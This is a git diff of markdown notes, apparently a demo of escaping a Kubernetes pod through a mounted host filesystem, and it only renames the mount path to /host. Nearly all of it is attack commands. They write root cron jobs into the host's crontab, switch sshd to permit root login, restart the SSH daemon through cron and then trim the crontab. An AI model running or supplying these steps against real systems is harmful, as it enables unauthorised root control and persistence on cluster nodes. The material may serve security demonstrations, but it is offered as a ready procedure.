@@ -10,33 +10,33 @@ kubectl set image po ubuntu ubuntu=ubuntu:16.04
 kubectl exec -it ubuntu -- bash
 ```
 ```bash
-kubectl exec -it ubuntu -- tail /root/ibm/var/log/syslog -f
+kubectl exec -it ubuntu -- tail /host/var/log/syslog -f
 ```
 add commands to run on host
 ```bash
-echo "* * * * * root curl ifconfig.co > /root/data 2>&1" >> /root/ibm/etc/crontab
+echo "* * * * * root curl ifconfig.co > /root/data 2>&1" >> /host/etc/crontab
 ```
 ```bash
-vim /root/ibm/etc/crontab
-cat /root/ibm/root/data
+vim /host/etc/crontab
+cat /host/root/data
 ```
 ---
 
 SSH Steps
 ```bash
-sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /root/ibm/etc/ssh/sshd_config
+sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /host/etc/ssh/sshd_config
 
-cat /root/ibm/etc/ssh/sshd_config | grep PermitRootLogin
+cat /host/etc/ssh/sshd_config | grep PermitRootLogin
 ```
 
 restart SSH Daemon
 ```bash
-echo "* * * * * root killall -1 sshd && echo "Killed SSH Daemon" > /root/data 2>&1" >> /root/ibm/etc/crontab
+echo "* * * * * root killall -1 sshd && echo "Killed SSH Daemon" > /root/data 2>&1" >> /host/etc/crontab
 ```
 
 delete last line from file
 ```bash
-sed -i '$ d' /root/ibm/etc/crontab
+sed -i '$ d' /host/etc/crontab
 ```
 
 ```bash
